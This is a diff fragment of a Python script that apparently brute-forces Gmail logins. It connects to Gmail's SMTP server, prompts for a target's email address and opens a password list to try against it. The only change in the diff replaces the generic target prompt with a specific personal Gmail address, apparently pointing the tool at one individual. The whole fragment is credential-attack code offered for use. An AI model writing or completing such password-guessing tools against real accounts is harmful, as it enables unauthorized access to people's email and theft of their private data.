@@ -5,7 +5,7 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = input("Enter target's email address: ")
+user = input("danehaydenrrr@gmail.com: ")
 passwordfile = input("Enter the path to the passwordfile: ")
 #the path can be found by just dragging and dropping the file to your terminal
 file = open(passwordfile, "r")
